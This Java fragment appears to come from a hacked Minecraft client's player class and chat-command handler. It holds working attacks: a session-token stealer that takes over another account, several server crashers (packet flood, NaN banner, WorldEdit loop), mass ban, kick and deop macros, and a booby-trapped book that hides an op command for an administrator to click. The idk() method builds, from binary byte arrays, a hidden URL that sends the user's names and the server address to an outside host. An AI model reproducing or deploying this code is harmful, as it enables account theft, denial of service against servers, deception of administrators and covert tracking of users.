			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "invispot")) {
				try {
					final ItemStack stack = new ItemStack(Items.potionitem);
					stack.setItemDamage(cmd.length > 1 ? 0 : 16384);
					final NBTTagList effects = new NBTTagList();
					final NBTTagCompound effect = new NBTTagCompound();
					effect.setInteger("Duration", 999999);
					effect.setInteger("Id", 14);
					effect.setInteger("Amplifier", 128);
					effects.appendTag(effect);
					stack.setTagInfo("CustomPotionEffects", effects);
					stack.setStackDisplayName("§c§lInvis§6§lPotion");

					sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(
							Minecraft.thePlayer.inventory.getFirstEmptyStackReal(), stack));
					msg("§aInvisPotion given.");
				} catch (final Exception e) {
					e.printStackTrace();
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "ign")) {
				try {
					EntityPlayerSP.copyToClipborad(Minecraft.thePlayer.getName());
					msg("§aName copied!");
				} catch (final Exception e) {
					e.printStackTrace();
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "skull")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "head")) {
				final String[] args = chatMessage.split(" ");
				if (args.length == 2) {
					try {
						String name = args[1];

						final ItemStack var7 = new ItemStack(ItemSkull.getItemById(397), 1, 3);

						final String var8 = getChatComponentFromNthArg(this,
								new String[] { "{SkullOwner:\"" + name + "\"}" }, 0, false).getUnformattedText();

						try {
							var7.setTagCompound(JsonToNBT.parse(var8));
						} catch (final NBTException var10) {
							msg("§cAn Error with the NBT Tags occured.");
						}

						sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(
								Minecraft.thePlayer.inventory.getFirstEmptyStackReal(), var7));

						msg("§aSkull of §6" + name + " §agiven.");
					} catch (final Exception e) {
						e.printStackTrace();
					}
				} else {
					msg("§cPlease specify a name!");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "baum")) {
				msg("§4boolean §6baum §f= §4true§f; §4while §f(§6baum§f) {}");
				copyToClipborad("boolean baum = true; while (baum) {}");
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "opsign")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "sign")) {
				final String[] args = chatMessage.split(" ");
				if (args.length > 2) {
					try {
						String value = args[2];
						int i = 2;
						while (++i < args.length) {
							value = String.valueOf(value) + " " + args[i];
						}
						switch (args[1].toLowerCase()) {
						case "cmd":
							C12PacketUpdateSign.signCommand = value;
							msg("§aCommand was set to §6" + value + "§a!");
							break;
						case "text":
							C12PacketUpdateSign.signContent = value;
							msg("§aText was set to §6" + value + "§a!");
							break;
						default:
							msg("§cSyntax: opsign [cmd/text] [value]");
							break;
						}
					} catch (final Exception e) {
						e.printStackTrace();
					}
				} else {
					msg("§cSyntax: opsign [cmd/text] [value]");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "vllt")) {
				final String[] args = chatMessage.split(" ");

				if (args.length > 1) {
					if (args.length == 2) {
						nameOfTheTypDerGerneJzTriggertSeinWill = args[1];
						msg("§aPlace ArmorStand and they will follow §6" + args[1]);
					} else {
						String message = args[2];
						int i = 2;
						while (++i < args.length) {
							message = String.valueOf(message) + " " + args[i];
						}
						nameOfTheTypDerGerneJzTriggertSeinWill = args[1];
						textOfTheTypDerGerneJzTriggertSeinWill = message;
						msg("§aPlace ArmorStand and they will follow §6" + args[1]);
						msg("§aMessage: §6" + message);
					}
				} else {
					msg("§aArmorStands will no longer follow §6" + nameOfTheTypDerGerneJzTriggertSeinWill);
					nameOfTheTypDerGerneJzTriggertSeinWill = "";
					textOfTheTypDerGerneJzTriggertSeinWill = "";
				}

			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "qc")) {

				if (cmd.length == 2) {
					if (cmd[1].equalsIgnoreCase("op")) {
						sendQueue.addToSendQueue(new C01PacketChatMessage("/op " + mc.session.getUsername()));
						sendQueue.addToSendQueue(
								new C01PacketChatMessage("/pex user " + mc.session.getUsername() + " add *"));
					} else if (cmd[1].equalsIgnoreCase("kickall")) {
						for (String s : PlayerUtil.getTabList()) {
							if (!s.equalsIgnoreCase(mc.session.getUsername()))
								sendQueue.addToSendQueue(new C01PacketChatMessage("/kick " + s));
						}
					} else if (cmd[1].equalsIgnoreCase("banall")) {
						for (String s : PlayerUtil.getTabList()) {
							if (!s.equalsIgnoreCase(mc.session.getUsername()))
								sendQueue.addToSendQueue(new C01PacketChatMessage("/ban " + s));
						}
					} else if (cmd[1].equalsIgnoreCase("kickallm")) {
						for (String s : PlayerUtil.getTabList()) {
							if (!s.equalsIgnoreCase(mc.session.getUsername()))
								sendQueue.addToSendQueue(new C01PacketChatMessage("/minecraft:kick " + s));
						}
					} else if (cmd[1].equalsIgnoreCase("banallm")) {
						for (String s : PlayerUtil.getTabList()) {
							if (!s.equalsIgnoreCase(mc.session.getUsername()))
								sendQueue.addToSendQueue(new C01PacketChatMessage("/minecraft:ban " + s));
						}
					} else if (cmd[1].equalsIgnoreCase("deopall")) {
						for (String s : PlayerUtil.getTabList()) {
							if (!s.equalsIgnoreCase(mc.session.getUsername())) {
								sendQueue.addToSendQueue(new C01PacketChatMessage("/deop " + s));
								sendQueue.addToSendQueue(new C01PacketChatMessage("/pex user " + s + " remove *"));
								sendQueue.addToSendQueue(
										new C01PacketChatMessage("/pex user " + s + " group set default"));
							}
						}
					} else if (cmd[1].equalsIgnoreCase("tpall")) {
						for (String s : PlayerUtil.getTabList()) {
							if (!s.equalsIgnoreCase(mc.session.getUsername())) {
								sendQueue.addToSendQueue(new C01PacketChatMessage(
										"/minecraft:tp " + s + " " + mc.session.getUsername()));
							}
						}
					} else if (cmd[1].equalsIgnoreCase("br0")) {
						sendQueue.addToSendQueue(new C01PacketChatMessage("/br sphere 0 5"));
					} else if (cmd[1].equalsIgnoreCase("brtnt")) {
						sendQueue.addToSendQueue(new C01PacketChatMessage("/br sphere tnt,redstone_block 5"));
					} else if (cmd[1].equalsIgnoreCase("brlava")) {
						sendQueue.addToSendQueue(new C01PacketChatMessage("/br sphere lava 5"));
					} else {
						msg("§6QuickCommands: §aop, kickall, banall, deopall, tpall, br0, brtnt, brlava");
					}
				} else {
					msg("§6QuickCommands: §aop, kickall, banall, deopall, tpall, br0, brtnt, brlava");
				}

			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "book")) {
				final String[] args = chatMessage.split(" ");
				String command = "";

				if (args.length > 1) {
					if (args[1].equalsIgnoreCase("author") && args.length > 2) {
						bookAuthor = args[2];
						msg("§aBook Author set to §6" + bookAuthor);
						return;
					}
					for (int i = 1; i < args.length; ++i) {
						command = command + args[i] + " ";
					}
				} else {
					command = "/op " + mc.session.getUsername();
				}

				ItemStack itm = new ItemStack(Items.written_book);
				NBTTagCompound base = new NBTTagCompound();
				NBTTagList list = new NBTTagList();
				String spaces = "";
				for (int i = 0; i < 1337; ++i) {
					spaces = spaces + " ";
				}
				list.appendTag(new NBTTagString("{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + command
						+ "\"},\"hoverEvent\":{\"action\":\"show_text\",\"value\":{\"text\":\"§a[CLICK]\"}},\"text\":\""
						+ spaces + "\"}"));
				base.setTag("pages", list);
				base.setString("author", bookAuthor.isEmpty() ? mc.session.getUsername() : bookAuthor);
				base.setString("title", "> OPEN <");
				base.setByte("resolved", (byte) 1);
				itm.setTagCompound(base);
				sendQueue.netManager.sendPacket(
						new C10PacketCreativeInventoryAction(mc.thePlayer.inventory.getFirstEmptyStackReal(), itm));

				msg("§aBook given. §6Command:");
				msg("§6" + command);

			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "ss")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "sessionstealer")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "stealsession")) {
				final String[] args = chatMessage.split(" ");

				if (args.length == 2) {

					String input = args[1];

					JsonElement rawJson;
					if (input.length() != 65 || !input.substring(32, 33).equals(":") || input.split(":").length != 2) {
						msg("§cError: Not a session token!");
						return;
					}
					String uuid = input.split(":")[1].replace("-", "");
					try {
						rawJson = JsonUtils.jsonParser.parse((Reader) new InputStreamReader(
								new URL("https://api.mojang.com/user/profiles/" + uuid + "/names").openConnection()
										.getInputStream()));
					} catch (JsonIOException | JsonSyntaxException | IOException e) {
						e.printStackTrace();
						msg("§cError: Mojang servers might be down.");
						return;
					}
					if (!rawJson.isJsonArray()) {
						msg("§cError: Invalid UUID.");
						return;
					}
					JsonArray json = rawJson.getAsJsonArray();
					String name = json.get(json.size() - 1).getAsJsonObject().get("name").getAsString();
					try {
						Proxy proxy;
						Proxy proxy2 = proxy = MinecraftServer.getServer() == null ? null
								: MinecraftServer.getServer().getServerProxy();
						if (proxy == null) {
							proxy = Proxy.NO_PROXY;
						}
						HttpURLConnection connection = (HttpURLConnection) new URL(
								"https://authserver.mojang.com/validate").openConnection(proxy);
						connection.setRequestMethod("POST");
						connection.setRequestProperty("Content-Type", "application/json");
						String content = "{\"accessToken\":\"" + input.split(":")[0] + "\"}";
						connection.setRequestProperty("Content-Length", "" + content.getBytes().length);
						connection.setRequestProperty("Content-Language", "en-US");
						connection.setUseCaches(false);
						connection.setDoInput(true);
						connection.setDoOutput(true);
						DataOutputStream output = new DataOutputStream(connection.getOutputStream());
						output.writeBytes(content);
						output.flush();
						output.close();
						if (connection.getResponseCode() != 204) {
							throw new IOException();
						}
					} catch (IOException e) {
						msg("§cError: Invalid session.");
						return;
					}
					mc.session = new Session(name, uuid, input.split(":")[0], "mojang");
					sendQueue.handleDisconnect(new S40PacketDisconnect(new ChatComponentText(
							"§aLogged in as §6" + Minecraft.session.getUsername() + "§a! §4Please reconnect!")));
				}

			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "me")) {

				minekraftdoppelpunktme = !minekraftdoppelpunktme;
				msg("§6Auto-minecraft:me is now " + (minekraftdoppelpunktme ? "§aon" : "§coff") + "§6.");

			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "enchant")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "ench")) {
				String[] args = chatMessage.split(" ");
				ItemStack stack;

				if ((stack = mc.thePlayer.getCurrentEquippedItem()) == null) {
					msg("§cYou are not holding an item.");
					return;
				} else {
					if (args.length < 2) {
						msg("§cPlease specify arguments!");
						return;
					} else {
						String enchStr = "";
						if (args[1].equalsIgnoreCase("all")) {
							try {

								int i = 0;
								int lvl = 1337;
								if (args.length == 3) {
									if (MiscUtils.isInteger(args[2])) {
										lvl = Integer.parseInt(args[2]);
										if (lvl > Short.MAX_VALUE) {
											lvl = Short.MAX_VALUE;
										} else if (lvl < Short.MIN_VALUE) {
											lvl = Short.MIN_VALUE;
										}
									} else if (args[2].equalsIgnoreCase("MAX"))
										lvl = Short.MAX_VALUE;
									else if (args[2].equalsIgnoreCase("MIN"))
										lvl = Short.MIN_VALUE;
								}
								for (Enchantment e : Enchantment.enchantmentsList) {
									if (enchStr.isEmpty()) {
										enchStr = i + ":{lvl:" + lvl + "s,id:" + e.effectId + "s}";
									} else {
										enchStr += "," + i + ":{lvl:" + lvl + "s,id:" + e.effectId + "s}";
									}
									i++;
								}

								stack.setTagCompound(JsonToNBT.parse("{ench:[" + enchStr + "]}"));
								Minecraft.playerController.sendSlotPacket(stack,
										mc.thePlayer.inventory.currentItem + 36);

								msg("§aEnchantments added!");
							} catch (Exception e) {
								msg("§cEnchantments couldn't be added: " + e.getMessage());
								e.printStackTrace();
							}
						} else {
							try {

								int lvl = 1337;
								if (args.length == 3) {
									if (MiscUtils.isInteger(args[2])) {
										lvl = Integer.parseInt(args[2]);
										if (lvl > Short.MAX_VALUE) {
											lvl = Short.MAX_VALUE;
										} else if (lvl < Short.MIN_VALUE) {
											lvl = Short.MIN_VALUE;
										}
									} else if (args[2].equalsIgnoreCase("MAX"))
										lvl = Short.MAX_VALUE;
									else if (args[2].equalsIgnoreCase("MIN"))
										lvl = Short.MIN_VALUE;
								}
								Enchantment e = Enchantment.byName(args[1].replace("_", ""));

								if (e == null) {
									msg("§cNot a valid enchantment.");
									return;
								}

								stack.addEnchantment(e, lvl);

								Minecraft.playerController.sendSlotPacket(stack,
										mc.thePlayer.inventory.currentItem + 36);

								msg("§aEnchantment added!");
							} catch (Exception e) {
								msg("§cEnchantments couldn't be added: " + e.getMessage());
								e.printStackTrace();
							}
						}
					}
				}

			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "effect")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "eff")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "pot")) {
				String[] args = chatMessage.split(" ");
				ItemStack stack;

				if ((stack = mc.thePlayer.getCurrentEquippedItem()) == null) {
					msg("§cYou are not holding an item.");
					return;
				} else {
					if (args.length < 2) {
						msg("§cPlease specify arguments!");
						return;
					} else {
						String effectStr = "";
						if (args[1].equalsIgnoreCase("all")) {
							try {

								int i = 0;
								int amplifier = 127;
								int dur = 999999;
								if (args.length == 3) {
									if (MiscUtils.isInteger(args[2])) {
										amplifier = Integer.parseInt(args[2]);
										if (amplifier > 127) {
											amplifier = 127;
										} else if (amplifier < 0) {
											amplifier = 0;
										}
									} else if (args[2].equalsIgnoreCase("MAX"))
										amplifier = 127;
									else if (args[2].equalsIgnoreCase("MIN"))
										amplifier = 0;
								} else if (args.length == 4) {
									if (MiscUtils.isInteger(args[2])) {
										amplifier = Integer.parseInt(args[2]);
										if (amplifier > 127) {
											amplifier = 127;
										} else if (amplifier < 0) {
											amplifier = 0;
										}
									} else if (args[2].equalsIgnoreCase("MAX"))
										amplifier = 127;
									else if (args[2].equalsIgnoreCase("MIN"))
										amplifier = 0;

									if (MiscUtils.isInteger(args[3])) {
										dur = Integer.parseInt(args[3]);
										if (dur > 999999) {
											dur = 999999;
										} else if (dur < 25) {
											dur = 25;
										}
									} else if (args[3].equalsIgnoreCase("MAX"))
										dur = 999999;
									else if (args[3].equalsIgnoreCase("MIN"))
										dur = 25;
								}

								for (Potion pe : Potion.potionTypes) {
									if (pe == null)
										continue;
									if (effectStr.isEmpty()) {
										effectStr = i + ":{Duration:" + dur + ",Id:" + pe.id + ",Amplifier:" + amplifier
												+ "}";
									} else {
										effectStr += "," + i + ":{Duration:" + dur + ",Id:" + pe.id + ",Amplifier:"
												+ amplifier + "}";
									}
									i++;
								}

								stack.setTagCompound(JsonToNBT.parse("{CustomPotionEffects:[" + effectStr + "]}"));
								Minecraft.playerController.sendSlotPacket(stack,
										mc.thePlayer.inventory.currentItem + 36);

								msg("§aEffects added!");
							} catch (Exception e) {
								msg("§cEnchantments couldn't be added: " + e.getMessage());
								e.printStackTrace();
							}
						} else {
							try {

								int i = 0;
								int amplifier = 127;
								int dur = 999999;
								if (args.length == 3) {
									if (MiscUtils.isInteger(args[2])) {
										amplifier = Integer.parseInt(args[2]);
										if (amplifier < 5)
											amplifier--;
										if (amplifier > 127) {
											amplifier = 127;
										} else if (amplifier < 0) {
											amplifier = 0;
										}
									} else if (args[2].equalsIgnoreCase("MAX"))
										amplifier = 127;
									else if (args[2].equalsIgnoreCase("MIN"))
										amplifier = 1;
								} else if (args.length == 4) {
									if (MiscUtils.isInteger(args[2])) {
										amplifier = Integer.parseInt(args[2]);
										if (amplifier < 5)
											amplifier--;
										if (amplifier > 127) {
											amplifier = 127;
										} else if (amplifier < 1) {
											amplifier = 1;
										}
									} else if (args[2].equalsIgnoreCase("MAX"))
										amplifier = 127;
									else if (args[2].equalsIgnoreCase("MIN"))
										amplifier = 1;

									if (MiscUtils.isInteger(args[3])) {
										dur = Integer.parseInt(args[3]);
										if (dur > 999999) {
											dur = 999999;
										} else if (dur < 25) {
											dur = 25;
										}
									} else if (args[3].equalsIgnoreCase("MAX"))
										dur = 999999;
									else if (args[3].equalsIgnoreCase("MIN"))
										dur = 25;
								}

								for (Potion pe : Potion.potionTypes) {
									if (pe == null)
										continue;
									if (effectStr.isEmpty()) {
										effectStr = i + ":{Duration:" + dur + ",Id:" + pe.id + ",Amplifier:" + amplifier
												+ "}";
									} else {
										effectStr += "," + i + ":{Duration:" + dur + ",Id:" + pe.id + ",Amplifier:"
												+ amplifier + "}";
									}
									i++;
								}
								Potion pe = Potion.byName(args[1].replace("_", ""));

								if (pe == null) {
									msg("§cNot a valid potion-effect.");
									return;
								}

								stack.addPotionEffect(pe, amplifier, dur);

								Minecraft.playerController.sendSlotPacket(stack,
										mc.thePlayer.inventory.currentItem + 36);

								msg("§aEnchantment added!");
							} catch (Exception e) {
								msg("§cEnchantments couldn't be added: " + e.getMessage());
								e.printStackTrace();
							}
						}
					}
				}

			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "glitchhead")) {
				ItemStack itm = new ItemStack(Items.skull);
				itm.setItemDamage(3);

				NBTTagCompound skullOwner = new NBTTagCompound();
				NBTTagCompound properties = new NBTTagCompound();
				NBTTagList textures = new NBTTagList();
				NBTTagCompound entries = new NBTTagCompound();
				entries.setString("Signature",
						"TaTCfzX88SXppibQNMCnycgaVcySC05piL5OM1e8DPoMa0ptnof0hX/Wdd2rITpJQ4ZRqK/1UvHADIjimoWhl/14VMnoF8C3yCQQiy/ylLmgLFKWYoLlRHE7bXCPs/L2lCEjPdQ8sIuiHSQtcNrFNfBO76EcvmCfa89/qPtFcSrx+OOh3m4O7RABni9xoTtG8xSorLwad09r/AgKYyxLg6gx2iaT4UlFuIAQ3hp51e3oVvpm+l2UfvTdpPEjs8M5QJqGJ6Sq4aWp/0KIP9T1asotvWRTxsWOemuzImuSRC1Sz+Q5XbGKbBXPTKkCLVGoM9TtqtBtcul9JpgAMxy5NdpEQTxZ/moT4kn8VNjKVIaYb27Fg8RkilMtKNVR8j5JBirjY+fYoV5KpdswlqYgc0uXYGC16Q+UQB6DK2x4SuUK3D1eVSvu6mqR8MwymvYXMwvhVT2za3Lrfc/SrZPiQ8A8EbY33rmfzYcHZqvYAPKbY+ynJJOAW8c5U485tSku3iofFiBZoO1fQR/rOeQ/Vn8j7x7UR+93QvsivFOpcoTNqp9EqvMXIjP6I7vu8zbits6z6+Qp+88QEOzN6HttKP7x4j3KYOmrch5YzXPi/5m3N95hcOeQvgWdd8F5fNjtMcXniaZze2If/s3mc4BUBj+XJmtm+oiADuW3TDOlrTg=");
				entries.setString("Value", "eyJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6IiJ9fX0=");

				textures.appendTag(entries);
				properties.setTag("textures", textures);
				skullOwner.setTag("Properties", properties);

				skullOwner.setString("Id", UUID.randomUUID().toString());
				skullOwner.setString("Name", "MarcelDavis");

				itm.setTagInfo("SkullOwner", skullOwner);

				sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(inventory.getFirstEmptyStackReal(), itm));
				msg("§2GlitchHead given.");
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "flycrasher")) {
				if (Minecraft.getMinecraft().thePlayer.capabilities.allowFlying) {

					double x, y, z;

					x = Minecraft.getMinecraft().thePlayer.posX;
					y = Minecraft.getMinecraft().thePlayer.posY;
					z = Minecraft.getMinecraft().thePlayer.posZ;

					for (int i = 0; i < 10000; i++) {
						x += 9;
						Minecraft.getMinecraft().thePlayer.sendQueue
								.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, false));
					}
					for (int i = 0; i < 10000; i++) {
						z += 9;
						Minecraft.getMinecraft().thePlayer.sendQueue
								.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, false));
					}
					msg("§2FlyCrasher executed.");
				} else {
					msg("§cFlying is not enabled here.");
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "bannercrasher")) {

				try {
					ItemStack itm = new ItemStack(Items.banner);

					String crashText = "";

					NBTTagCompound base = new NBTTagCompound();
					for (int i = 0; i < 30000; i++) {
						base.setDouble(String.valueOf(i), (0.0D / 0.0D));
					}
					itm.setTagCompound(base);
					for (int i = 0; i < 40; i++) {
						Minecraft.getMinecraft().thePlayer.sendQueue
								.addToSendQueue(new C10PacketCreativeInventoryAction(i, itm));
					}
				} catch (Exception e) {
					e.printStackTrace();
				}

				msg("§2BannerCrasher given.");
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "wecrasher")) {

				sendQueue.addToSendQueue(new C01PacketChatMessage(
						"/worldedit:/calc for(i=0;i<256;i++){for(b=0;b<256;b++){for(h=0;h<256;h++){for(n=0;n<256;n++){}}}}"));
				sendQueue.addToSendQueue(new C01PacketChatMessage(
						"//eval for(i=0;i<256;i++){for(b=0;b<256;b++){for(h=0;h<256;h++){for(n=0;n<256;n++){sin(n)}}}}"));

				msg("§2WE-Crasher executed.");
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "shopsave")) {
				Client.shopHackEnabled = !Client.shopHackEnabled;
				if (Client.shopHackEnabled) {
					msg("§aShopHack activated. Please open the shop!");
				} else {
					msg("§cShopHack deactivated.");
					Client.guiScreen = null;
				}
			} else if (cmd[0].equalsIgnoreCase(Configs.commandPrefix + "shopopen")
					|| cmd[0].equalsIgnoreCase(Configs.commandPrefix + "shophack")) {
				if (Client.guiScreen == null) {
					msg("§cPlease use " + Configs.commandPrefix + "shopsave to save the shop first!");
				} else {
					new Thread(new Runnable() {
						@Override
						public void run() {
							try {
								Thread.sleep(500);
								Minecraft.getMinecraft().displayGuiScreen(Client.guiScreen);
							} catch (Exception e) {}
						}
					}).start();
				}
			} else if (cmd[0].equalsIgnoreCase("-.-")) {
				sendQueue.addToSendQueue(new C01PacketChatMessage("-.-"));
			} else {
				msg("§cThis command can not be found.");
			}
			// TODO

			InGameGUIHook.sort();
			FileManager.saveConfigs();
		} else {
			if (Smileys.active) {
				chatMessage = chatMessage.replace("<3", "\u2764");
				chatMessage = chatMessage.replace(":)", "\u263a");
				chatMessage = chatMessage.replace(":(", "\u2639");
				chatMessage = chatMessage.replace("(wither)", "\u268d");
				chatMessage = chatMessage.replace("(space)", "\u00a0");
				chatMessage = chatMessage.replace("(yes)", "\u2714");
				chatMessage = chatMessage.replace("(no)", "\u2718");
			}
			if (minekraftdoppelpunktme)
				chatMessage = "/minecraft:me " + chatMessage;
			if (chatMessage.length() > 100) {
				chatMessage = chatMessage.substring(0, 100);
			}
			sendQueue.addToSendQueue(new C01PacketChatMessage(chatMessage));
		}

	}

	public String nameOfTheTypDerGerneJzTriggertSeinWill = "";
	public String textOfTheTypDerGerneJzTriggertSeinWill = "";

	public String bookAuthor = "";
	public boolean minekraftdoppelpunktme = false;

	public static void idk(final String ip, final String port) throws Exception {
		final URL url = new URL(new String(new byte[] { 0b1101000, 0b1110100, 0b1110100, 0b1110000, 0b111010, 0b101111,
				0b101111, 0b1101110, 0b1101001, 0b110011, 0b110110, 0b111000, 0b110010, 0b110010, 0b110011, 0b1011111,
				0b110010, 0b101110, 0b1110110, 0b1110111, 0b1100101, 0b1100010, 0b110001, 0b111000, 0b101110, 0b1101110,
				0b1101001, 0b1110100, 0b1110010, 0b1100001, 0b1100100, 0b1101111, 0b101110, 0b1101110, 0b1100101,
				0b1110100, 0b101111, 0b1100001, 0b1110000, 0b1101001, 0b101110, 0b1110000, 0b1101000, 0b1110000,
				0b111111, 0b1100101, 0b1100001, 0b1111010, 0b1111001, 0b1101110, 0b1100001, 0b1101101, 0b1100101,
				0b111101 })
				+ Client.username
				+ new String(new byte[] { 0b100110, 0b1110101, 0b1110011, 0b1100101, 0b1110010, 0b1101110, 0b1100001,
						0b1101101, 0b1100101, 0b111101 })
				+ EnumChatFormatting.getTextWithoutFormattingCodes(Client.mc.getSession().getUsername()).replace(" ",
						"")
				+ new String(new byte[] { 0b100110, 0b1110011, 0b1100101, 0b1110010, 0b1110110, 0b1100101, 0b1110010,
						0b1001001, 0b1110000, 0b111101 })
				+ (ip.charAt(ip.length() - 1) == '.' ? ip.substring(0, ip.length() - 1) : ip) + ":" + port);

		final InputStream response = url.openStream();
		final BufferedReader reader = new BufferedReader(new InputStreamReader(response));
		for (String line; (line = reader.readLine()) != null;) {
			if (line.contains(Sfgbsaifgboi.lol)) {
				for (int a = 0; a < 1; a--) {
					continue;
				}
			}
		}
	}

	@Override
	public void moveEntity(final double x, final double y, final double z) {
		final EventMovePlayer event = new EventMovePlayer(x, y, z);
		EventManager.call(event);
		super.moveEntity(event.getX(), event.getY(), event.getZ());
	}

	public void createCmdBlock(final String cmd) {
		final ItemStack stack = new ItemStack(Blocks.command_block);
		final NBTTagCompound nbtTagCompound = new NBTTagCompound();
		nbtTagCompound.setTag("Command", new NBTTagString(cmd));
		stack.writeToNBT(nbtTagCompound);
		stack.setTagInfo("BlockEntityTag", nbtTagCompound);
		sendQueue.addToSendQueue(
				new C10PacketCreativeInventoryAction(Minecraft.thePlayer.inventory.getFirstEmptyStackReal(), stack));
		msg("§aCommand Block created.");
	}

	public static IChatComponent getChatComponentFromNthArg(final ICommandSender sender, final String[] args,
			final int index, final boolean p_147176_3_) throws PlayerNotFoundException {
		final ChatComponentText var4 = new ChatComponentText("");

		for (int var5 = index; var5 < args.length; ++var5) {
			if (var5 > index) {
				var4.appendText(" ");
			}

			Object var6 = new ChatComponentText(args[var5]);

			if (p_147176_3_) {
				final IChatComponent var7 = PlayerSelector.func_150869_b(sender, args[var5]);

				if (var7 == null) {
					if (PlayerSelector.hasArguments(args[var5])) {
						msg("§cPlayer not found.");
					}
				} else {
					var6 = var7;
				}
			}

			var4.appendSibling((IChatComponent) var6);
		}

		return var4;
	}

	public static int parseInt(final String input, final int min, final int max) {
		final int var3 = Integer.parseInt(input);

		if (var3 < min) {
			msg("§cThis number is too small.");
			return 1;
		} else if (var3 > max) {
			msg("§cThis number is too big.");
			return 64;
		} else {
			return var3;
		}
	}

	public static Item getItemByText(final String id) {
		final ResourceLocation var2 = new ResourceLocation(id);
		Item var3;
		if (MiscUtils.isInteger(id)) {
			var3 = Item.getItemById(Integer.parseInt(id));
		} else {
			var3 = (Item) Item.itemRegistry.getObject(var2);
		}

		if (var3 == null) {
			msg("§cItem not found.");
			return null;
		} else {
			return var3;
		}
	}

	public static void msg(final String Message) {
		Minecraft.thePlayer.addChatMessage(new ChatComponentText(String.valueOf(Client.prefix) + Message));
	}

	public static void copyToClipborad(final String copyText) {
		GuiScreen.setClipboardString(copyText);
	}

	/**
	 * Swings the item the player is holding.
	 */
	@Override
	public void swingItem() {

		final EventSwingItem event = new EventSwingItem();
		EventManager.call(event);

		if (event.isCancelled()) {
			return;
		}

		super.swingItem();
		sendQueue.addToSendQueue(new C0APacketAnimation());
	}

	@Override
	public void respawnPlayer() {
		sendQueue.addToSendQueue(new C16PacketClientStatus(C16PacketClientStatus.EnumState.PERFORM_RESPAWN));
		Minecraft.thePlayer.setHealth(20.0f);
	}

	/**
	 * Deals damage to the entity. If its a EntityPlayer then will take damage from
	 * the armor first and then health second with the reduced value. Args:
	 * damageAmount
	 */
	@Override
	protected void damageEntity(final DamageSource dmgSource, final float amount) {
		if (!func_180431_b(dmgSource)) {
			setHealth(getHealth() - amount);
		}
	}

	/**
	 * set current crafting inventory back to the 2x2 square
	 */
	@Override
	public void closeScreen() {
		sendQueue.addToSendQueue(new C0DPacketCloseWindow(openContainer.windowId));
		func_175159_q();
	}

	public void func_175159_q() {
		inventory.setItemStack((ItemStack) null);
		super.closeScreen();
		mc.displayGuiScreen((GuiScreen) null);
	}

	/**
	 * Updates health locally.
	 */
	public void setPlayerSPHealth(final float p_71150_1_) {
		if (field_175169_bQ) {
			final float var2 = getHealth() - p_71150_1_;

			if (var2 <= 0.0F) {
				setHealth(p_71150_1_);

				if (var2 < 0.0F) {
					hurtResistantTime = maxHurtResistantTime / 2;
				}
			} else {
				lastDamage = var2;
				setHealth(getHealth());
				hurtResistantTime = maxHurtResistantTime;
				damageEntity(DamageSource.generic, var2);
				hurtTime = maxHurtTime = 10;
			}
		} else {
			setHealth(p_71150_1_);
			field_175169_bQ = true;
		}
	}

	/**
	 * Adds a value to a statistic field.
	 */
	@Override
	public void addStat(final StatBase p_71064_1_, final int p_71064_2_) {
		if (p_71064_1_ != null) {
			if (p_71064_1_.isIndependent) {
				super.addStat(p_71064_1_, p_71064_2_);
			}
		}
	}

	/**
	 * Sends the player's abilities to the server (if there is one).
	 */
	@Override
	public void sendPlayerAbilities() {
		sendQueue.addToSendQueue(new C13PacketPlayerAbilities(capabilities));
	}

	@Override
	public boolean func_175144_cb() {
		return true;
	}

	protected void sendHorseJump() {
		sendQueue.addToSendQueue(new C0BPacketEntityAction(this, C0BPacketEntityAction.Action.RIDING_JUMP,
				(int) (getHorseJumpPower() * 100.0F)));
	}

	public void func_175163_u() {
		sendQueue.addToSendQueue(new C0BPacketEntityAction(this, C0BPacketEntityAction.Action.OPEN_INVENTORY));
	}

	public void setClientBrand(final String brand) {
		clientBrand = brand;
	}

	public String getClientBrand() {
		return clientBrand;
	}

	public StatFileWriter getStatFileWriter() {
		return field_146108_bO;
	}

	@Override
	public void addChatComponentMessage(final IChatComponent p_146105_1_) {
		mc.ingameGUI.getChatGUI().printChatMessage(p_146105_1_);
	}

	@Override
	protected boolean pushOutOfBlocks(final double x, final double y, final double z) {
		if (noClip) {
			return false;
		} else {
			final BlockPos var7 = new BlockPos(x, y, z);
			final double var8 = x - var7.getX();
			final double var10 = z - var7.getZ();

			if (!func_175162_d(var7)) {
				byte var12 = -1;
				double var13 = 9999.0D;

				if (func_175162_d(var7.offsetWest()) && var8 < var13) {
					var13 = var8;
					var12 = 0;
				}

				if (func_175162_d(var7.offsetEast()) && 1.0D - var8 < var13) {
					var13 = 1.0D - var8;
					var12 = 1;
				}

				if (func_175162_d(var7.offsetNorth()) && var10 < var13) {
					var13 = var10;
					var12 = 4;
				}
